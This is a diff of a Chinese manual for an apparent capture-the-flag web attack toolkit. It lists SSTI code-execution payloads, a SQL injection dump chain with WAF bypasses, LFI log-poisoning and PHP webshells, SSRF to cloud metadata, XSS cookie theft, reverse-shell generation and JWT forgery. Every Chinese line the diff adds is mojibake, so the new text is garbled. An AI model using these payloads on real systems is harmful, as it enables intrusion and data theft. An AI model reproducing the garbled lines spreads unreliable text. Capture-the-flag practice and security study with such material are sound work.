@@ -1,52 +1,52 @@
-# Yang-Web 操作手册 📖
+# Yang-Web æä½æå ð
 
-> 每个功能的详细操作方法、使用场景、示例和技巧
+> æ¯ä¸ªåè½çè¯¦ç»æä½æ¹æ³ãä½¿ç¨åºæ¯ãç¤ºä¾åæå·§
 
 ---
 
-## 启动方式
+## å¯å¨æ¹å¼
 
-### GUI 图形界面（推荐）
-双击桌面 **Yang-web** 图标，暗色窗口启动后顶部有 Tab 标签页切换功能模块。
+### GUI å¾å½¢çé¢ï¼æ¨èï¼
+åå»æ¡é¢ **Yang-web** å¾æ ï¼æè²çªå£å¯å¨åé¡¶é¨æ Tab æ ç­¾é¡µåæ¢åè½æ¨¡åã
 
-### CLI 命令行
+### CLI å½ä»¤è¡
 ```bash
-cd C:\Users\阳\.qclaw\workspace\Yang-web
+cd C:\Users\é³\.qclaw\workspace\Yang-web
 python -m yang_web sqli --db MySQL
 ```
 
 ---
 
-## 1. 🔓 解码器
+## 1. ð è§£ç å¨
 
-**场景**：拿到一段乱码 / 编码字符串，不知道是什么格式，要还原成明文。
+**åºæ¯**ï¼æ¿å°ä¸æ®µä¹±ç  / ç¼ç å­ç¬¦ä¸²ï¼ä¸ç¥éæ¯ä»ä¹æ ¼å¼ï¼è¦è¿åæææã
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 自动检测 + 链式解码（推荐）
+# èªå¨æ£æµ + é¾å¼è§£ç ï¼æ¨èï¼
 python -m yang_web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="
 
-# 暴力尝试所有编码器，筛选可读结果
+# æ´åå°è¯ææç¼ç å¨ï¼ç­éå¯è¯»ç»æ
 python -m yang_web decode --brute "dGVzdA=="
 
-# 管道输入
+# ç®¡éè¾å¥
 echo "ZmxhZ3t0ZXN0fQ==" | python -m yang_web decode
 ```
 
-### GUI 操作
-1. 点击 **🔓 解码** 标签
-2. 在输入框粘贴密文
-3. 点 **🔍 自动解码** → 查看链式解码过程
-4. 如果自动检测不准，点 **💣 暴力尝试** → 列出所有可能的结果
+### GUI æä½
+1. ç¹å» **ð è§£ç ** æ ç­¾
+2. å¨è¾å¥æ¡ç²è´´å¯æ
+3. ç¹ **ð èªå¨è§£ç ** â æ¥çé¾å¼è§£ç è¿ç¨
+4. å¦æèªå¨æ£æµä¸åï¼ç¹ **ð£ æ´åå°è¯** â ååºææå¯è½çç»æ
 
-### 支持编码
-base64 / base32 / base16 / base58 / base85 / URL编码 / HTML实体 / ROT13 / 二进制 / 八进制 / 十进制ASCII / Unicode转义 / 摩斯电码
+### æ¯æç¼ç 
+base64 / base32 / base16 / base58 / base85 / URLç¼ç  / HTMLå®ä½ / ROT13 / äºè¿å¶ / å«è¿å¶ / åè¿å¶ASCII / Unicodeè½¬ä¹ / æ©æ¯çµç 
 
 ---
 
-## 2. 🔢 编码
+## 2. ð¢ ç¼ç 
 
-**场景**：构造 Payload 时需要把特殊字符编码。
+**åºæ¯**ï¼æé  Payload æ¶éè¦æç¹æ®å­ç¬¦ç¼ç ã
 
 ```bash
 python -m yang_web encode base64 "admin' OR 1=1 -- "
@@ -56,35 +56,35 @@ python -m yang_web encode rot13 "flag"
 
 ---
 
-## 3. 🎨 SSTI 模板注入
+## 3. ð¨ SSTI æ¨¡æ¿æ³¨å¥
 
-**场景**：网页输入 `{{7*7}}` 返回 `49`，确认 SSTI 漏洞后利用。
+**åºæ¯**ï¼ç½é¡µè¾å¥ `{{7*7}}` è¿å `49`ï¼ç¡®è®¤ SSTI æ¼æ´åå©ç¨ã
 
-### GUI 操作
-1. 点击 **🎨 SSTI** 标签
-2. 从下拉框选择引擎（默认全部）
-3. 查看检测 Payload 和利用 Payload
-4. 搜索框搜 `RCE` 找远程执行相关 Payload
+### GUI æä½
+1. ç¹å» **ð¨ SSTI** æ ç­¾
+2. ä»ä¸ææ¡éæ©å¼æï¼é»è®¤å¨é¨ï¼
+3. æ¥çæ£æµ Payload åå©ç¨ Payload
+4. æç´¢æ¡æ `RCE` æ¾è¿ç¨æ§è¡ç¸å³ Payload
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 列出支持的引擎
+# ååºæ¯æçå¼æ
 python -m yang_web ssti --list
 
-# 获取指定引擎的检测 Payload
+# è·åæå®å¼æçæ£æµ Payload
 python -m yang_web ssti --detect --engine "Jinja2"
 
-# 获取利用 Payload（RCE / 文件读取）
+# è·åå©ç¨ Payloadï¼RCE / æä»¶è¯»åï¼
 python -m yang_web ssti --exploit --engine "Jinja2"
 
-# 搜索特定 Payload
+# æç´¢ç¹å® Payload
 python -m yang_web ssti --search RCE
 ```
 
-### 支持引擎
-Jinja2 (Flask) · Twig (Symfony) · Smarty (PHP) · Mako (Python) · ERB (Ruby) · FreeMarker (Java) · Velocity (Java) · Django
+### æ¯æå¼æ
+Jinja2 (Flask) Â· Twig (Symfony) Â· Smarty (PHP) Â· Mako (Python) Â· ERB (Ruby) Â· FreeMarker (Java) Â· Velocity (Java) Â· Django
 
-### 典型 Payload
+### å¸å Payload
 ```
 Jinja2 RCE:
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
@@ -96,243 +96,243 @@ Twig RCE:
 
 ---
 
-## 4. 🗄️ SQL 注入
+## 4. ðï¸ SQL æ³¨å¥
 
-**场景**：发现注入点后，从探测到脱库一步到位。
+**åºæ¯**ï¼åç°æ³¨å¥ç¹åï¼ä»æ¢æµå°è±åºä¸æ­¥å°ä½ã
 
-### GUI 操作
-1. 点击 **🗄️ SQLi** 标签
-2. 下拉框选数据库类型（MySQL / PG / MSSQL / Oracle / SQLite）
-3. 左侧显示该数据库的所有 Payload
-4. 搜索框搜 `报错` / `时间` / `堆叠` 等关键词
-5. 点击顶部其他 Tab 查看 **WAF 绕过技巧**
+### GUI æä½
+1. ç¹å» **ðï¸ SQLi** æ ç­¾
+2. ä¸ææ¡éæ°æ®åºç±»åï¼MySQL / PG / MSSQL / Oracle / SQLiteï¼
+3. å·¦ä¾§æ¾ç¤ºè¯¥æ°æ®åºçææ Payload
+4. æç´¢æ¡æ `æ¥é` / `æ¶é´` / `å å ` ç­å³é®è¯
+5. ç¹å»é¡¶é¨å¶ä» Tab æ¥ç **WAF ç»è¿æå·§**
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 列出支持的数据库
+# ååºæ¯æçæ°æ®åº
 python -m yang_web sqli --list
 
-# 显示探测 Payload（闭合/列数/回显位/指纹）
+# æ¾ç¤ºæ¢æµ Payloadï¼é­å/åæ°/åæ¾ä½/æçº¹ï¼
 python -m yang_web sqli --detect
 
-# 获取 MySQL 全量 Payload
+# è·å MySQL å¨é Payload
 python -m yang_web sqli --db MySQL
 
-# 获取盲注模板
+# è·åç²æ³¨æ¨¡æ¿
 python -m yang_web sqli --blind
 
-# 搜索 Payload
-python -m yang_web sqli --search 报错
+# æç´¢ Payload
+python -m yang_web sqli --search æ¥é
 
-# 🆕 WAF 绕过
-python -m yang_web sqli --waf              # 全部
-python -m yang_web sqli --waf 空白符绕过    # 按分类
-python -m yang_web sqli --waf 关键字变形
+# ð WAF ç»è¿
+python -m yang_web sqli --waf              # å¨é¨
+python -m yang_web sqli --waf ç©ºç½ç¬¦ç»è¿    # æåç±»
+python -m yang_web sqli --waf å³é®å­åå½¢
 ```
 
-### 典型攻击链
+### å¸åæ»å»é¾
 ```
-1. 闭合探测: '  → 报错 → 确认注入
-2. 列数探测: ORDER BY 3 → 正常 / ORDER BY 4 → 报错 → 3列
-3. 回显位: UNION SELECT 1,2,3 → 页面显示 2 → 第2位可回显
-4. 数据库名: UNION SELECT 1,database(),3
-5. 表名: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
-6. 列名: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'
-7. 脱数据: UNION SELECT 1,flag_column,3 FROM flag_table
+1. é­åæ¢æµ: '  â æ¥é â ç¡®è®¤æ³¨å¥
+2. åæ°æ¢æµ: ORDER BY 3 â æ­£å¸¸ / ORDER BY 4 â æ¥é â 3å
+3. åæ¾ä½: UNION SELECT 1,2,3 â é¡µé¢æ¾ç¤º 2 â ç¬¬2ä½å¯åæ¾
+4. æ°æ®åºå: UNION SELECT 1,database(),3
+5. è¡¨å: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
+6. åå: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'
+7. è±æ°æ®: UNION SELECT 1,flag_column,3 FROM flag_table
 ```
 
-### WAF 绕过速查
-| 场景 | 方法 | 示例 |
+### WAF ç»è¿éæ¥
+| åºæ¯ | æ¹æ³ | ç¤ºä¾ |
 |------|------|------|
-| 空格被过滤 | 注释/括号/空白符 | `'/**/UNION/**/SELECT/**/1` |
-| 关键字被过滤 | 双写/大小写 | `seselectlect` |
-| select 被过滤 | 编码 | `char(115,101,108,101,99,116)` |
-| 等号被过滤 | like/rlike | `' AND 1 LIKE 1` |
-| 逗号被过滤 | JOIN | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` |
-| 引号被过滤 | 宽字节 | `%df' OR 1=1#` |
+| ç©ºæ ¼è¢«è¿æ»¤ | æ³¨é/æ¬å·/ç©ºç½ç¬¦ | `'/**/UNION/**/SELECT/**/1` |
+| å³é®å­è¢«è¿æ»¤ | åå/å¤§å°å | `seselectlect` |
+| select è¢«è¿æ»¤ | ç¼ç  | `char(115,101,108,101,99,116)` |
+| ç­å·è¢«è¿æ»¤ | like/rlike | `' AND 1 LIKE 1` |
+| éå·è¢«è¿æ»¤ | JOIN | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` |
+| å¼å·è¢«è¿æ»¤ | å®½å­è | `%df' OR 1=1#` |
 
 ---
 
-## 5. 📂 LFI 文件包含
+## 5. ð LFI æä»¶åå«
 
-**场景**：URL 中有 `?page=xxx` → 读源码 / 日志污染 → RCE。
+**åºæ¯**ï¼URL ä¸­æ `?page=xxx` â è¯»æºç  / æ¥å¿æ±¡æ â RCEã
 
-### GUI 操作
-1. 点击 **📂 LFI** 标签
-2. 下拉框选类别（路径遍历 / PHP伪协议 / 敏感文件）
+### GUI æä½
+1. ç¹å» **ð LFI** æ ç­¾
+2. ä¸ææ¡éç±»å«ï¼è·¯å¾éå / PHPä¼ªåè®® / æææä»¶ï¼
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 路径遍历 Payload
+# è·¯å¾éå Payload
 python -m yang_web lfi --traversal
 
-# Linux 敏感文件列表
+# Linux æææä»¶åè¡¨
 python -m yang_web lfi --linux
 
-# Windows 敏感文件列表
+# Windows æææä»¶åè¡¨
 python -m yang_web lfi --windows
 
-# PHP 伪协议
+# PHP ä¼ªåè®®
 python -m yang_web lfi --php
 
-# PHP filter chain 生成器
+# PHP filter chain çæå¨
 python -m yang_web lfi --filter-chain
 ```
 
-### 典型攻击链
+### å¸åæ»å»é¾
 ```
-1. 读 /etc/passwd: ../../../etc/passwd
-2. 读源码: php://filter/convert.base64-encode/resource=index.php
-3. 日志污染: 在 User-Agent 写 <?php eval($_POST[1]);?> → 包含 access.log
+1. è¯» /etc/passwd: ../../../etc/passwd
+2. è¯»æºç : php://filter/convert.base64-encode/resource=index.php
+3. æ¥å¿æ±¡æ: å¨ User-Agent å <?php eval($_POST[1]);?> â åå« access.log
 4. data:// RCE: data://text/plain,<?php system('id');?>
 5. expect:// RCE: expect://id
 ```
 
 ---
 
-## 6. 🌐 SSRF
+## 6. ð SSRF
 
-**场景**：URL 参数接受任意地址 → 读云元数据 / 打内网。
+**åºæ¯**ï¼URL åæ°æ¥åä»»æå°å â è¯»äºåæ°æ® / æåç½ã
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 云平台元数据地址
+# äºå¹³å°åæ°æ®å°å
 python -m yang_web ssrf --cloud aws      # AWS
-python -m yang_web ssrf --cloud aliyun    # 阿里云
-python -m yang_web ssrf --cloud tencent   # 腾讯云
+python -m yang_web ssrf --cloud aliyun    # é¿éäº
+python -m yang_web ssrf --cloud tencent   # è¾è®¯äº
 
-# 内网地址段
+# åç½å°åæ®µ
 python -m yang_web ssrf --internal
 
-# 协议利用（gopher 打 Redis / dict 扫端口）
+# åè®®å©ç¨ï¼gopher æ Redis / dict æ«ç«¯å£ï¼
 python -m yang_web ssrf --protocol
 
-# 绕过技巧
+# ç»è¿æå·§
 python -m yang_web ssrf --bypass
 ```
 
-### 典型 Payload
+### å¸å Payload
 ```
-AWS 元数据: http://169.254.169.254/latest/meta-data/
-阿里云:     http://100.100.100.200/latest/meta-data/
-Gopher 打 Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
+AWS åæ°æ®: http://169.254.169.254/latest/meta-data/
+é¿éäº:     http://100.100.100.200/latest/meta-data/
+Gopher æ Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
 ```
 
 ---
 
-## 7. 💉 XSS
+## 7. ð XSS
 
-**场景**：输入框没有过滤 → XSS → 窃取 Cookie / 钓鱼。
+**åºæ¯**ï¼è¾å¥æ¡æ²¡æè¿æ»¤ â XSS â çªå Cookie / éé±¼ã
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 检测 Payload
+# æ£æµ Payload
 python -m yang_web xss --detect
 
-# 窃取 Payload
-python -m yang_web xss --steal cookie     # Cookie 窃取
-python -m yang_web xss --steal storage    # LocalStorage 窃取
+# çªå Payload
+python -m yang_web xss --steal cookie     # Cookie çªå
+python -m yang_web xss --steal storage    # LocalStorage çªå
 
-# 绕过技巧
+# ç»è¿æå·§
 python -m yang_web xss --bypass
 
-# Vue / Angular 模板注入
+# Vue / Angular æ¨¡æ¿æ³¨å¥
 python -m yang_web xss --template
 ```
 
 ---
 
-## 8. 💻 RCE 命令注入
+## 8. ð» RCE å½ä»¤æ³¨å¥
 
-**场景**：`?cmd=ping 127.0.0.1` 能执行命令 → 反弹 Shell。
+**åºæ¯**ï¼`?cmd=ping 127.0.0.1` è½æ§è¡å½ä»¤ â åå¼¹ Shellã
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 命令注入 Payload
+# å½ä»¤æ³¨å¥ Payload
 python -m yang_web rce --inject
 
-# 生成反弹 Shell
+# çæåå¼¹ Shell
 python -m yang_web rce --shell bash --ip 10.0.0.1 --port 4444
 python -m yang_web rce --shell python --ip 10.0.0.1 --port 4444
 python -m yang_web rce --shell powershell --ip 10.0.0.1 --port 4444
 
-# 自定义反弹 Shell
+# èªå®ä¹åå¼¹ Shell
 python -m yang_web rce --custom
 ```
 
-### 链接符速查
+### é¾æ¥ç¬¦éæ¥
 ```
 ;  |  ||  &&  &  %0a  \n  `  $()
 ```
 
-### 空格绕过
+### ç©ºæ ¼ç»è¿
 ```
 ${IFS}  $IFS$9  <>  {cmd,arg}  %09  %0a
 ```
 
 ---
 
-## 9. 🐘 PHP 技巧
+## 9. ð PHP æå·§
 
-**场景**：PHP 代码审计 / 弱类型逻辑绕过 / WAF 拦截。
+**åºæ¯**ï¼PHP ä»£ç å®¡è®¡ / å¼±ç±»åé»è¾ç»è¿ / WAF æ¦æªã
 
-### GUI 操作
-1. 点击 **🐘 PHP** 标签
-2. 查看 Magic Hash / 弱类型比较 / RCE Bypass / WAF 绕过
+### GUI æä½
+1. ç¹å» **ð PHP** æ ç­¾
+2. æ¥ç Magic Hash / å¼±ç±»åæ¯è¾ / RCE Bypass / WAF ç»è¿
 
-### CLI 操作
+### CLI æä½
 ```bash
 # Magic Hash
 python -m yang_web php --magic
 
-# 弱类型比较
+# å¼±ç±»åæ¯è¾
 python -m yang_web php --type-juggle
 
-# 反序列化
+# ååºåå
 python -m yang_web php --deserialize
 
 # RCE Bypass
 python -m yang_web php --rce
 
-# 🆕 WAF 绕过
+# ð WAF ç»è¿
 python -m yang_web php --waf-php
 ```
 
-### Magic Hash 怎么用
+### Magic Hash æä¹ç¨
 ```
-if ($_GET['password'] == '0e46209743...') → 弱比较绕过密码
+if ($_GET['password'] == '0e46209743...') â å¼±æ¯è¾ç»è¿å¯ç 
 ```
-输入 `240610708` 即可（它的 MD5 以 `0e` 开头 → PHP 将其解释为科学计数法 0）
+è¾å¥ `240610708` å³å¯ï¼å®ç MD5 ä»¥ `0e` å¼å¤´ â PHP å°å¶è§£éä¸ºç§å­¦è®¡æ°æ³ 0ï¼
 
-### WAF 绕过怎么选
+### WAF ç»è¿æä¹é
 ```
-eval 被过滤 → evaleval (双写) 或 'ev'.'al' (拼接) 或 assert (替换)
-system 被过滤 → `id` (反引号) 或 call_user_func('system','id')
-关键字被过滤 → base64_decode('...') 或 str_rot13('...')
+eval è¢«è¿æ»¤ â evaleval (åå) æ 'ev'.'al' (æ¼æ¥) æ assert (æ¿æ¢)
+system è¢«è¿æ»¤ â `id` (åå¼å·) æ call_user_func('system','id')
+å³é®å­è¢«è¿æ»¤ â base64_decode('...') æ str_rot13('...')
 ```
 
 ---
 
-## 10. 📤 文件上传
+## 10. ð¤ æä»¶ä¸ä¼ 
 
-**场景**：上传头像处 → "只能上传图片" → 绕过限制上传 Shell。
+**åºæ¯**ï¼ä¸ä¼ å¤´åå¤ â "åªè½ä¸ä¼ å¾ç" â ç»è¿éå¶ä¸ä¼  Shellã
 
-### GUI 操作
-1. 点击 **📤 Upload** 标签
-2. 依次查看：后缀绕过 → MIME 伪造 → 内容绕过 → 解析漏洞 → 高级技巧
+### GUI æä½
+1. ç¹å» **ð¤ Upload** æ ç­¾
+2. ä¾æ¬¡æ¥çï¼åç¼ç»è¿ â MIME ä¼ªé  â åå®¹ç»è¿ â è§£ææ¼æ´ â é«çº§æå·§
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 后缀名绕过
+# åç¼åç»è¿
 python -m yang_web upload --ext
 
-# Content-Type 伪造
+# Content-Type ä¼ªé 
 python -m yang_web upload --mime
 
-# 图片马内容
+# å¾çé©¬åå®¹
 python -m yang_web upload --content
 
-# 解析漏洞
+# è§£ææ¼æ´
 python -m yang_web upload --parse nginx
 python -m yang_web upload --parse apache
 python -m yang_web upload --parse iis
@@ -341,147 +341,147 @@ python -m yang_web upload --parse iis
 python -m yang_web upload --htaccess
 python -m yang_web upload --userini
 
-# 高级技巧
+# é«çº§æå·§
 python -m yang_web upload --advanced
 ```
 
-### 典型攻击链
+### å¸åæ»å»é¾
 ```
-1. 后缀绕过: shell.php → 被拦截
-2. 换后缀: shell.php3 / shell.phtml / shell.php. . (Win)
-3. 改 MIME: Content-Type: image/jpeg + 文件头 GIF89a
-4. 内容绕过: GIF89a<?=eval($_POST[1]);?>
-5. 上传成功 → 访问
-6. 如果还不行 → .htaccess / .user.ini / 条件竞争
+1. åç¼ç»è¿: shell.php â è¢«æ¦æª
+2. æ¢åç¼: shell.php3 / shell.phtml / shell.php. . (Win)
+3. æ¹ MIME: Content-Type: image/jpeg + æä»¶å¤´ GIF89a
+4. åå®¹ç»è¿: GIF89a<?=eval($_POST[1]);?>
+5. ä¸ä¼ æå â è®¿é®
+6. å¦æè¿ä¸è¡ â .htaccess / .user.ini / æ¡ä»¶ç«äº
 ```
 
-### 一句话速查
+### ä¸å¥è¯éæ¥
 ```
-图片马: GIF89a<?=eval($_POST[1]);?>
+å¾çé©¬: GIF89a<?=eval($_POST[1]);?>
 .htaccess: AddType application/x-httpd-php .jpg
 .user.ini: auto_prepend_file=shell.jpg
-Nginx解析: 上传 1.jpg → 访问 /uploads/1.jpg/1.php
+Nginxè§£æ: ä¸ä¼  1.jpg â è®¿é® /uploads/1.jpg/1.php
 ```
 
 ---
 
-## 11. 🔍 Hash 识别
+## 11. ð Hash è¯å«
 
-**场景**：拿到一段 Hash，不知道是什么算法。
+**åºæ¯**ï¼æ¿å°ä¸æ®µ Hashï¼ä¸ç¥éæ¯ä»ä¹ç®æ³ã
 
-### GUI 操作
-1. 点击 **🔍 Hash** 标签
-2. 粘贴 Hash → 点 **识别**
+### GUI æä½
+1. ç¹å» **ð Hash** æ ç­¾
+2. ç²è´´ Hash â ç¹ **è¯å«**
 
-### CLI 操作
+### CLI æä½
 ```bash
 python -m yang_web hashid "e10adc3949ba59abbe56e057f20f883e"
 python -m yang_web hashid "$2y$10$..."
 ```
 
-### 输出示例
+### è¾åºç¤ºä¾
 ```
-📋 输入: e10adc3949ba59abbe56e057f20f883e
-📏 长度: 32 字符
-📊 可能的算法:
-  • MD5
-  • NTLM
-  • MD4
-  • Domain Cached Credentials
+ð è¾å¥: e10adc3949ba59abbe56e057f20f883e
+ð é¿åº¦: 32 å­ç¬¦
+ð å¯è½çç®æ³:
+  â¢ MD5
+  â¢ NTLM
+  â¢ MD4
+  â¢ Domain Cached Credentials
 ```
 
 ---
 
-## 12. 🔑 JWT 攻击
+## 12. ð JWT æ»å»
 
-**场景**：登录后 Cookie 里有 `eyJ...` → JWT Token → 尝试攻击。
+**åºæ¯**ï¼ç»å½å Cookie éæ `eyJ...` â JWT Token â å°è¯æ»å»ã
 
-### GUI 操作
-1. 点击 **🔑 JWT** 标签
-2. 粘贴 Token
-3. 依次点：**📋 解析** → **🔍 分析** → **⚡ None攻击** → **💣 弱密钥爆破**
+### GUI æä½
+1. ç¹å» **ð JWT** æ ç­¾
+2. ç²è´´ Token
+3. ä¾æ¬¡ç¹ï¼**ð è§£æ** â **ð åæ** â **â¡ Noneæ»å»** â **ð£ å¼±å¯é¥çç ´**
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 解析（查看 header + payload）
+# è§£æï¼æ¥ç header + payloadï¼
 python -m yang_web jwt "eyJhbGciOiJSUzI1NiIs..."
 
-# 安全分析
+# å®å¨åæ
 python -m yang_web jwt "eyJ..." --analyze
 
-# None 算法攻击（alg 改为 none）
+# None ç®æ³æ»å»ï¼alg æ¹ä¸º noneï¼
 python -m yang_web jwt "eyJ..." --none
 
-# 弱密钥爆破
+# å¼±å¯é¥çç ´
 python -m yang_web jwt "eyJ..." --brute
 
-# 已知密钥伪造 Token
+# å·²ç¥å¯é¥ä¼ªé  Token
 python -m yang_web jwt "eyJ..." --forge --secret "mysecret" --payload '{"admin":true}'
 ```
 
-### 典型攻击链
+### å¸åæ»å»é¾
 ```
-1. 解析 JWT → 查看 alg (RS256/HS256)
-2. 如果有 jku/jwk → SSRF / 密钥注入
-3. 尝试 None 攻击 → alg: none → 签名置空
-4. 弱密钥爆破 → 内置 100+ 常见密钥
-5. 拿到密钥 → 伪造 admin Token
+1. è§£æ JWT â æ¥ç alg (RS256/HS256)
+2. å¦ææ jku/jwk â SSRF / å¯é¥æ³¨å¥
+3. å°è¯ None æ»å» â alg: none â ç­¾åç½®ç©º
+4. å¼±å¯é¥çç ´ â åç½® 100+ å¸¸è§å¯é¥
+5. æ¿å°å¯é¥ â ä¼ªé  admin Token
 ```
 
 ---
 
-## 13. 📡 目录扫描
+## 13. ð¡ ç®å½æ«æ
 
-**场景**：拿到了目标网站，想知道有哪些隐藏目录/文件。
+**åºæ¯**ï¼æ¿å°äºç®æ ç½ç«ï¼æ³ç¥éæåªäºéèç®å½/æä»¶ã
 
-### CLI 操作
+### CLI æä½
 ```bash
-# 目录扫描
+# ç®å½æ«æ
 python -m yang_web scan dir --search flag
 python -m yang_web scan dir --search config
 python -m yang_web scan dir --search admin
 
-# 文件扫描
+# æä»¶æ«æ
 python -m yang_web scan file --search backup
 python -m yang_web scan file --search sql
 
-# 列出所有词库
+# ååºææè¯åº
 python -m yang_web scan --list
 ```
 
-### 内置词库
-- 目录：300+ 条（admin/backup/config/flag/log/upload...）
-- 文件：100+ 条（index.php.bak/www.zip/.git/config...）
+### åç½®è¯åº
+- ç®å½ï¼300+ æ¡ï¼admin/backup/config/flag/log/upload...ï¼
+- æä»¶ï¼100+ æ¡ï¼index.php.bak/www.zip/.git/config...ï¼
 
 ---
 
-## 📊 功能速查表
+## ð åè½éæ¥è¡¨
 
-| 遇到什么 | 用什么命令 | 一键命令 |
+| éå°ä»ä¹ | ç¨ä»ä¹å½ä»¤ | ä¸é®å½ä»¤ |
 |----------|-----------|---------|
-| 一段乱码 | decode | `python -m yang_web decode "xxx"` |
-| 模板注入 | ssti | `python -m yang_web ssti --exploit --engine Jinja2` |
-| SQL 注入 | sqli | `python -m yang_web sqli --db MySQL` |
-| 文件包含 | lfi | `python -m yang_web lfi --traversal` |
+| ä¸æ®µä¹±ç  | decode | `python -m yang_web decode "xxx"` |
+| æ¨¡æ¿æ³¨å¥ | ssti | `python -m yang_web ssti --exploit --engine Jinja2` |
+| SQL æ³¨å¥ | sqli | `python -m yang_web sqli --db MySQL` |
+| æä»¶åå« | lfi | `python -m yang_web lfi --traversal` |
 | SSRF | ssrf | `python -m yang_web ssrf --cloud aws` |
 | XSS | xss | `python -m yang_web xss --detect` |
-| 命令注入 | rce | `python -m yang_web rce --shell bash --ip IP --port PORT` |
-| PHP 绕过 | php | `python -m yang_web php --waf-php` |
-| 文件上传 | upload | `python -m yang_web upload --ext` |
-| 未知 Hash | hashid | `python -m yang_web hashid "xxx"` |
+| å½ä»¤æ³¨å¥ | rce | `python -m yang_web rce --shell bash --ip IP --port PORT` |
+| PHP ç»è¿ | php | `python -m yang_web php --waf-php` |
+| æä»¶ä¸ä¼  | upload | `python -m yang_web upload --ext` |
+| æªç¥ Hash | hashid | `python -m yang_web hashid "xxx"` |
 | JWT Token | jwt | `python -m yang_web jwt "eyJ..."` |
-| 目录扫描 | scan | `python -m yang_web scan dir --search flag` |
+| ç®å½æ«æ | scan | `python -m yang_web scan dir --search flag` |
 
 ---
 
-## 💡 GUI vs CLI 选择
+## ð¡ GUI vs CLI éæ©
 
 | | GUI | CLI |
 |------|:---:|:---:|
-| 浏览 Payload | ✅ 直观 | ⚠ 需记参数 |
-| 快速复制 | ✅ Ctrl+C | ✅ pipe |
-| 搜索筛选 | ✅ 框输入 | ✅ --search |
-| 批量/脚本 | ❌ | ✅ |
-| 比赛环境 | ⚠ 需显示器 | ✅ 纯终端 |
+| æµè§ Payload | â ç´è§ | â  éè®°åæ° |
+| å¿«éå¤å¶ | â Ctrl+C | â pipe |
+| æç´¢ç­é | â æ¡è¾å¥ | â --search |
+| æ¹é/èæ¬ | â | â |
+| æ¯èµç¯å¢ | â  éæ¾ç¤ºå¨ | â çº¯ç»ç«¯ |
 
-建议：平时用 GUI 浏览和学习，打比赛时用 CLI 快速调用。
+å»ºè®®ï¼å¹³æ¶ç¨ GUI æµè§åå­¦ä¹ ï¼ææ¯èµæ¶ç¨ CLI å¿«éè°ç¨ã
